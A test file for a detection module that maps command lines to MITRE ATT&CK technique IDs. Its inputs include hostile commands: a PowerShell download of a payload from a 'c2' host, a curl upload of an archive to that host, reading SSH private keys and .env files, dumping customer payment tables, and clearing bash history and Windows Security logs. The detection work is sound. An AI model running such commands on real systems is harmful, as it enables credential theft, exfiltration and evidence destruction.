import { describe, it, expect } from "vitest";
import { reconTechniques, unionEventTechniques, techniqueName } from "../../src/analysis/reconTechniques.js";

describe("reconTechniques — discovery / credential-access tagging", () => {
  it("tags the veridia host-recon commands (evt-004)", () => {
    expect(reconTechniques("C:\\Windows\\System32\\whoami.exe", "whoami /all")).toContain("T1033");
    expect(reconTechniques("C:\\Windows\\System32\\ipconfig.exe", "ipconfig /all")).toContain("T1016");
    expect(reconTechniques("C:\\Windows\\System32\\systeminfo.exe", "systeminfo")).toContain("T1082");
    expect(reconTechniques("C:\\Windows\\System32\\net.exe", 'net group "Domain Admins" /domain')).toContain(
      "T1069.002",
    );
    expect(reconTechniques("C:\\Windows\\System32\\net.exe", "net user /domain")).toContain("T1087.002");
  });

  it("tags the credential-hunt commands (evt-005)", () => {
    expect(reconTechniques("cmd.exe", "dir /s /b C:\\Users\\marcus.chen\\.ssh\\")).toEqual(
      expect.arrayContaining(["T1083", "T1552.004"]),
    );
    expect(reconTechniques("cmd.exe", "type C:\\Users\\marcus.chen\\.ssh\\id_rsa")).toContain("T1552.004");
    expect(reconTechniques("findstr.exe", 'findstr /s /i "password" C:\\Users\\Public\\*')).toContain(
      "T1552.001",
    );
  });

  it("tags arp network recon (evt-008) and the Linux DB recon (evt-010)", () => {
    expect(reconTechniques("arp.exe", "arp -a")).toContain("T1018");
    expect(reconTechniques("/usr/bin/id", "id")).toContain("T1033");
    expect(reconTechniques("/usr/bin/uname", "uname -a")).toContain("T1082");
    expect(reconTechniques("/usr/bin/find", "find /opt -name '*.env' 2>/dev/null")).toEqual(
      expect.arrayContaining(["T1083", "T1552.001"]),
    );
    expect(reconTechniques("/usr/bin/cat", "cat /opt/veridia-app/.env")).toContain("T1552.001");
  });

  it("tags the action techniques that survive in EDR telemetry after history-clearing (evt-006/011/012/013/014/009)", () => {
    expect(
      reconTechniques(
        "powershell.exe",
        "(New-Object System.Net.WebClient).DownloadFile('https://c2/wdi-svc.exe','C:\\Windows\\Temp\\wdi-svc.exe')",
      ),
    ).toContain("T1105");
    expect(
      reconTechniques("/usr/bin/mysqldump", "mysqldump -u veridia_app -p prod customers payment_methods"),
    ).toContain("T1005");
    expect(reconTechniques("/usr/bin/gzip", "gzip -9 /tmp/export-4291.sql")).toContain("T1560.001");
    expect(reconTechniques("/usr/bin/curl", "curl -X POST https://c2/api/sync -F data=@/tmp/x.gz")).toContain(
      "T1041",
    );
    expect(reconTechniques("/usr/bin/truncate", "truncate -s 0 ~/.bash_history")).toContain("T1070.003");
    expect(reconTechniques("wevtutil.exe", "wevtutil cl Security")).toContain("T1070.001");
    expect(reconTechniques("/usr/bin/ssh", "ssh deploy@10.10.20.20")).toContain("T1021.004");
  });

  it("does not tag benign non-recon commands", () => {
    expect(reconTechniques("/usr/bin/ls", "ls -la")).toEqual([]);
    expect(reconTechniques("powershell.exe", "Get-Date")).toEqual([]);
    expect(reconTechniques("/usr/bin/curl", "curl https://example.com")).toEqual([]); // plain download w/o -o is not T1105
  });

  it("techniqueName resolves recon ids, falls back to the bare id", () => {
    expect(techniqueName("T1033")).toBe("System Owner/User Discovery");
    expect(techniqueName("T9999")).toBe("T9999");
  });
});

describe("unionEventTechniques", () => {
  it("adds in-scope event techniques missing from the synthesized table, with names", () => {
    const table = [{ id: "T1003.001", name: "OS Credential Dumping: LSASS Memory", findingIds: ["f1"] }];
    const events = [{ mitreTechniques: ["T1033", "T1003.001"] }, { mitreTechniques: ["T1552.004", ""] }];
    const out = unionEventTechniques(table, events);
    const byId = Object.fromEntries(out.map((t) => [t.id, t.name]));
    expect(byId["T1003.001"]).toBe("OS Credential Dumping: LSASS Memory"); // preserved (not duplicated)
    expect(out.filter((t) => t.id === "T1003.001")).toHaveLength(1);
    expect(byId["T1033"]).toBe("System Owner/User Discovery");
    expect(byId["T1552.004"]).toBe("Unsecured Credentials: Private Keys");
    expect(out.some((t) => t.id === "")).toBe(false);
  });

  it("is idempotent", () => {
    const table = [{ id: "T1033", name: "System Owner/User Discovery", findingIds: [] }];
    const events = [{ mitreTechniques: ["T1033"] }];
    expect(unionEventTechniques(table, events)).toHaveLength(1);
  });
});

describe("reconTechniques — renamed archivers and scripted uploads (#2090)", () => {
  it("tags a renamed 7-Zip creating an archive by its switch signature", () => {
    expect(reconTechniques("svch.exe", "svch.exe a -t7z C:\\$Recycle.Bin\\old.7z C:\\data")).toContain(
      "T1560.001",
    );
    expect(reconTechniques("x.exe", "x.exe a -mx9 -tzip out.zip C:\\data")).toContain("T1560.001");
    expect(reconTechniques("7z.exe", "7z a out.7z C:\\data")).toContain("T1560.001");
  });

  it("does not tag an archive extraction", () => {
    expect(reconTechniques("svch.exe", "svch.exe x -t7z C:\\in.7z -oC:\\out")).not.toContain("T1560.001");
  });

  it("tags scripted FTP and BITS uploads as T1041", () => {
    expect(reconTechniques("ftp.exe", "ftp.exe -v -s:ftp.txt")).toContain("T1041");
    expect(reconTechniques("ftp", "ftp -i -s:C:\\Users\\Public\\u.txt 203.0.113.9")).toContain("T1041");
    expect(
      reconTechniques("bitsadmin.exe", "bitsadmin /transfer j /upload https://x.example/u C:\\a.7z"),
    ).toContain("T1041");
  });

  it("does not tag interactive FTP or a BITS download as T1041", () => {
    expect(reconTechniques("ftp.exe", "ftp.exe 203.0.113.9")).not.toContain("T1041");
    expect(
      reconTechniques("bitsadmin.exe", "bitsadmin /transfer j https://x.example/a.exe C:\\a.exe"),
    ).not.toContain("T1041");
  });
});
